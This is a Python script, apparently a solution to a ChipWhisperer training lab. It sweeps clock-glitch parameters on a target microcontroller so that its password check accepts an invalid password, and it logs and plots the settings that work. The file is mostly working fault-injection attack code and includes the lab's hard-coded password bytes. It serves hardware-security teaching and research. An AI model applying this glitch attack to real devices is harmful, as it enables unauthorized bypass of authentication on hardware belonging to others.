# Glitch loop to bypass password validation.
# Based on ChipWhisperer lab Fault 1_2 - Clock Glitching to Bypass Password.

import time
import struct
import json
import matplotlib.pyplot as plt
import chipwhisperer as cw
import chipwhisperer.common.results.glitch as glitch
from datetime import datetime


# SCAN_HITS_ONLY when True, iterates only over the (width, offset) pairs defined
# in SUCCESSFUL_HITS instead of the full range controlled by the glitch controller
SCAN_HITS_ONLY = False
PLOT_GROUP_BY_WIDTH = False
TARGET_TYPE = cw.targets.SimpleSerial2

# Glitch controller configuration parameters
GLOBAL_STEP_SIZES = [400, 200, 100]
WIDTH_MAX  = 4200
WIDTH_MIN  = 0
OFFSET_MAX = 4400
OFFSET_MIN = 2300
EXTOFF_MAX = 100
EXTOFF_MIN = 0
EXTOFF_STEP = 1
    
# (width, offset) pairs that provided hits during the characterization test in
# lab Fault 1_1 - Introduction to Clock Glitching
SUCCESSFUL_HITS = [
    (3700, 2300),
    (1500, 2300),
    (3000, 2300),
    (0,    2300),
    (400,  2300),
    (2200, 2300),
    (2800, 2300),
    (4200, 4400),
]

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
filename = f"glitch_results_{timestamp}.json"
figure = f"glitch_plot_{timestamp}.png"

# Plot configuration
PLOT_WIDTH_PER_SUBPLOT = 4  # inches per subplot when group_by_width
PLOT_WIDTH_SINGLE = 10
PLOT_HEIGHT = 7             # inches tall

RES_WIDTH_IDX = 0
RES_OFFSET_IDX = 1
RES_EXTOFF_IDX = 2
results = {"success": ([], [], []), "reset": ([], [], [])}  # (widths, offsets, ext_offsets)

def _plot_on_ax(ax, title, width_filter=None):
    ax.set_xlabel("ext_offset")
    ax.set_ylabel("offset")
    ax.set_title(title)

    def filter_results(group):
        return [
            (ww, o, x) for ww, o, x in zip(*results[group])
            if width_filter is None or ww == width_filter
        ]

    reset_pts = filter_results("reset")
    success_pts = filter_results("success")

    if reset_pts:
        ax.scatter([x for _, _, x in reset_pts], [o for _, o, _ in reset_pts],
                   marker="x", color="red", label="reset")
    if success_pts:
        ax.scatter([x for _, _, x in success_pts], [o for _, o, _ in success_pts],
                   marker="+", color="green", s=200, label="success")
    ax.legend()

def update_plot(fig, group_by_width=False):
    fig.clear()
    if group_by_width:
        unique_widths = sorted(set(results["reset"][RES_WIDTH_IDX] + results["success"][RES_WIDTH_IDX]))
        n = max(len(unique_widths), 1)
        fig.set_size_inches(n * PLOT_WIDTH_PER_SUBPLOT, PLOT_HEIGHT)
        axes = fig.subplots(1, n, sharey=True)
        if n == 1:
            axes = [axes]
        for ax, w in zip(axes, unique_widths):
            _plot_on_ax(ax, f"width={w}", width_filter=w)
    else:
        fig.set_size_inches(PLOT_WIDTH_SINGLE, PLOT_HEIGHT)
        _plot_on_ax(fig.add_subplot(), "Glitch Results")

    fig.tight_layout()
    fig.canvas.draw()
    fig.canvas.flush_events()

def save_results(ctrl_obj):
    gc = ctrl_obj["gc"]
    fig = ctrl_obj["fig"]
    gc_res = gc.calc(sort="success_rate")
    with open(filename, "w") as f:
        json.dump([list(r) for r in gc_res], f, indent=2)
    fig.savefig(figure)

def extend_results(classification, width, offset, ext_offset):
    results[classification][RES_WIDTH_IDX].append(width)
    results[classification][RES_OFFSET_IDX].append(offset)
    results[classification][RES_EXTOFF_IDX].append(ext_offset)

def reboot_flush(ctrl_obj):
    scope = ctrl_obj["scope"]
    target = ctrl_obj["target"]
    scope.io.nrst = "low"
    time.sleep(0.25)
    scope.io.nrst = "high_z"
    time.sleep(0.25)
    target.flush()

def check_comm_to_target(ctrl_obj):
    scope = ctrl_obj["scope"]
    target = ctrl_obj["target"]
    reboot_flush(ctrl_obj)
    # correct password ASCII representation
    pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68]) 
    target.simpleserial_write('p', pw)
    
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10) # For loop check
    valid = val['valid']
    if valid:
        response = val['payload']
        raw_serial = val['full_response']
        error_code = val['rv']
    
    print(val)

def setup_chipwhisperer():
    scope = cw.scope()
    target = cw.target(scope, TARGET_TYPE)
    scope.default_setup()
    scope.cglitch_setup()
    
    scope.glitch.enabled = True
    scope.glitch.repeat = 10  # Number of clock cycles to repeat the glitch
    scope.glitch.clk_src = "pll"
    scope.glitch.output = "clock_xor" # glitch_out = clk ^ glitch
    scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
    scope.io.hs2 = "glitch"  # output glitch_out on the clock line
    scope.adc.timeout = 0.1
    
    print(scope.glitch)
    
    gc = glitch.GlitchController(
        groups=["success", "reset", "normal"],
        parameters=["width", "offset", "ext_offset"]
    )

    gc.set_global_step(GLOBAL_STEP_SIZES)
    gc.set_range("width", WIDTH_MIN, WIDTH_MAX)
    gc.set_range("offset", OFFSET_MIN, OFFSET_MAX)
    gc.set_range("ext_offset", EXTOFF_MIN, EXTOFF_MAX)
    gc.set_step("ext_offset", EXTOFF_STEP)

    return {"scope": scope, "target": target, "gc": gc}

def run_glitch_loop(ctrl_obj):
    scope = ctrl_obj["scope"]
    target = ctrl_obj["target"]
    gc = ctrl_obj["gc"]
    fig = ctrl_obj["fig"]
    reboot_flush(ctrl_obj)
    invalid_pw = bytearray([0x00] * 5)
    if SCAN_HITS_ONLY:
        loop = ((w, o, e) for w, o in SUCCESSFUL_HITS for e in range(0, 100, 1))
    else:
        loop = ((gs[0], gs[1], gs[2]) for gs in gc.glitch_values())
    
    for i, (width, offset, ext_offset) in enumerate(loop):
        print(f"width: {width}, offset: {offset}, ext_offset: {ext_offset}")
        scope.glitch.width = width
        scope.glitch.offset = offset
        scope.glitch.ext_offset = ext_offset
    
        if scope.adc.state:
            print("Trigger still high!")
            gc.add("reset", parameters=[width, offset, ext_offset])
            extend_results("reset", width, offset, ext_offset)
            update_plot(fig, PLOT_GROUP_BY_WIDTH)
            reboot_flush(ctrl_obj)
    
        scope.arm()
        target.simpleserial_write('p', invalid_pw)
        ret = scope.capture()
        if ret:
            print("Timeout - no trigger")
            gc.add("reset", parameters=[width, offset, ext_offset])
            extend_results("reset", width, offset, ext_offset)
            update_plot(fig, PLOT_GROUP_BY_WIDTH)
            reboot_flush(ctrl_obj)
        else:
            val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)
            invalid_response = not val['valid']
            if invalid_response:
                gc.add("reset", parameters=[width, offset, ext_offset])
                extend_results("reset", width, offset, ext_offset)
                update_plot(fig, PLOT_GROUP_BY_WIDTH)
            else:
                valid_passwd = struct.unpack("<b", val['payload'])[0]
                if valid_passwd:
                    gc.add("success", parameters=[width, offset, ext_offset])
                    extend_results("success", width, offset, ext_offset)
                    update_plot(fig, PLOT_GROUP_BY_WIDTH)
                    print(val['payload'])
                    print(f"SUCCESS → width={width}, offset={offset}, ext_offset={ext_offset}")
                else:
                    gc.add("normal", parameters=[width, offset, ext_offset])
    
        if i % 100 == 0:
            save_results(ctrl_obj)
    
    save_results(ctrl_obj)

    print("Done.")
    plt.ioff()
    plt.show()

if __name__ == "__main__":
    ctrl_obj = setup_chipwhisperer()
    ctrl_obj["fig"], ax = plt.subplots()
    plt.ion()
    plt.show()
    run_glitch_loop(ctrl_obj)
